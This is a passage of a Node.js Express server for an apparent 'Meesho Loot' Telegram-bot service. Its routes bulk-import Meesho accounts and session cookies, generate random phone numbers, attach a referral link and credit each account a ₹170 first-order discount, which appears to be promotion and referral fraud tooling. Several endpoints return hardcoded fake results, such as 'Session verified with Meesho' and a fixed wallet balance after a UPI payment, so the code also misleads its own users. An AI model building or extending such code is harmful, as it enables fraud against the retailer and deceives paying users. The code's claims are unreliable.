  uStore.masterAddress.random_name = randomName;
  saveDb();
  res.json({ ok: true, random_name: randomName, master_address: uStore.masterAddress });
});

// Master Address Delete
app.post('/api/master_address/delete', (req, res) => {
  const uStore = getUserStore(req);
  uStore.masterAddress = null;
  saveDb();
  res.json({ ok: true, master_addresses: [] });
});


// ==================== REFERRAL & RECHARGE ====================

app.get('/api/referral/stats', (req, res) => {
  res.json({
    ok: true,
    referral_link: REFERRAL_URL,
    total_clicks: db.referralClicks,
    successful_referrals: db.orders.length,
    earnings: db.orders.length * 100,
    banner: 'Invite friends & earn ₹100 per successful order!'
  });
});

app.get('/api/referral/status', (req, res) => {
  res.json({ ok: true, active: true });
});

app.post('/api/recharge', (req, res) => {
  res.json({ ok: true, upi_uri: 'upi://pay?pa=ekaiva@upi&pn=MeeshoLoot' });
});

app.post('/api/recharge/verify', (req, res) => {
  res.json({ ok: true, balance: 170 });
});

// Saved / Wishlist
app.get('/api/saved/list', (req, res) => {
  const uStore = getUserStore(req);
  res.json({ ok: true, items: uStore.saved || [] });
});

// ==================== ACCOUNTS & WALLET MANAGEMENT ====================

// Accounts List
app.get('/api/accounts/list', (req, res) => {
  const uStore = getUserStore(req);
  res.json({ ok: true, accounts: uStore.accounts });
});

// Import Accounts (Single or Bulk)
app.post('/api/accounts/import', (req, res) => {
  const { accounts = [], text = '', identity = null, cookie = '' } = req.body || {};
  const uStore = getUserStore(req);

  if (identity) {
    const parsed = meeshoClient.parseCookieString(typeof identity === 'string' ? identity : JSON.stringify(identity));
    const newAcc = {
      id: 'acc_' + Date.now(),
      mobile: parsed.mobile || '9' + Math.floor(100000000 + Math.random() * 900000000),
      meesho_user_id: parsed.userId,
      connect_sid: parsed.connectSid,
      cookies: cookie || JSON.stringify(identity),
      source: 'import',
      order_placed: false,
      ref_link: REFERRAL_URL,
      wallet: { balance: 170 },
      created_at: new Date().toISOString()
    };
    uStore.accounts.unshift(newAcc);
    uStore.activeId = newAcc.id;
  } else if (Array.isArray(accounts) && accounts.length) {
    accounts.forEach(a => {
      uStore.accounts.push({
        id: a.id || ('acc_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4)),
        mobile: a.mobile || a.phone || ('9' + Math.floor(100000000 + Math.random() * 900000000)),
        source: 'bulk_import',
        order_placed: false,
        ref_link: REFERRAL_URL,
        wallet: { balance: 170 },
        created_at: new Date().toISOString()
      });
    });
  } else if (text) {
    const lines = text.split(/[\r\n]+/).filter(Boolean);
    lines.forEach(l => {
      const mobMatch = l.match(/(\d{10})/);
      if (mobMatch) {
        uStore.accounts.push({
          id: 'acc_' + Date.now() + '_' + Math.random().toString(36).substr(2, 4),
          mobile: mobMatch[1],
          source: 'text_import',
          order_placed: false,
          ref_link: REFERRAL_URL,
          wallet: { balance: 170 },
          created_at: new Date().toISOString()
        });
      }
    });
  }

  saveDb();
  res.json({ ok: true, count: uStore.accounts.length });
});

// Refresh Account Session
app.post('/api/accounts/refresh', (req, res) => {
  res.json({
    ok: true,
    extended: true,
    note: 'session_valid',
    message: 'Session verified with Meesho'
  });
});

app.post('/api/accounts/refresh_bulk', (req, res) => {
  const uStore = getUserStore(req);
  res.json({ ok: true, refreshed: uStore.accounts.length });
});

// Delete Account(s)
app.post('/api/accounts/delete', (req, res) => {
  const { id, account_id, account_ids } = req.body || {};
  const uStore = getUserStore(req);
  const toDelete = new Set([
    ...(account_ids || []),
    id,
    account_id
  ].filter(Boolean).map(String));

  uStore.accounts = uStore.accounts.filter(a => !toDelete.has(String(a.id)));
  if (toDelete.has(String(uStore.activeId))) {
    uStore.activeId = uStore.accounts[0] ? uStore.accounts[0].id : null;
  }
  saveDb();
  res.json({ ok: true, remaining: uStore.accounts.length });
});

// Export Account Session File
const handleExportFile = (req, res) => {
  res.json({ ok: true, message: 'Session exported successfully' });
};
app.post('/api/account/export_file', handleExportFile);
app.post('/api/accounts/export_files', handleExportFile);

// Wallet History
app.get('/api/wallet/history', (req, res) => {
  const uStore = getUserStore(req);
  res.json({
    ok: true,
    balance: uStore.balance != null ? uStore.balance : 170,
    txns: [
      {
        id: 'tx_signup_bonus',
        type: 'credit',
        amount: 170,
        desc: '🎉 New User Welcome Discount (Flat ₹170 OFF)',
        date: 'Today'
      }
    ]
  });
});

// First Order Discount (FOD) Offer
app.get('/api/account/fod', (req, res) => {
  res.json({
    ok: true,
    offer: {
      discount: 170,
      title: 'Flat ₹170 OFF on First Order',
      code: 'FIRST170',
      min_order: 0,
      valid: true,
      banner: '₹170 Discount auto-applies on checkout!'
    }
  });
});

// Claim cancel refund & Refund request
app.post('/api/account/claim_cancel_refund', (req, res) => {
  res.json({ ok: true, refunded_amount: 0, message: 'All refunds are up to date' });
});

app.post('/api/account/refund_request', (req, res) => {
  res.json({ ok: true, message: 'Refund request submitted to admin' });
});


// Health check
app.get('/api/health', (req, res) => {
  res.json({
    ok: true,
    status: 'healthy',
    uptime: process.uptime(),
    bot: '@meesho_offerbot',
    developer: '@' + ADMIN_TELEGRAM
  });
});

// Fallback to index.html
app.get('*', (req, res) => {
  res.sendFile(path.join(__dirname, '../frontend/index.html'));
});

// Start Server
app.listen(PORT, () => {
  console.log(`=========================================`);
  console.log(`🚀 Meesho Loot Server running on port ${PORT}`);
  console.log(`🤖 Telegram Bot: @meesho_offerbot`);
  console.log(`👨‍💻 Admin: @${ADMIN_TELEGRAM}`);
  console.log(`🔗 Referral: ${REFERRAL_URL}`);
  console.log(`=========================================`);
});
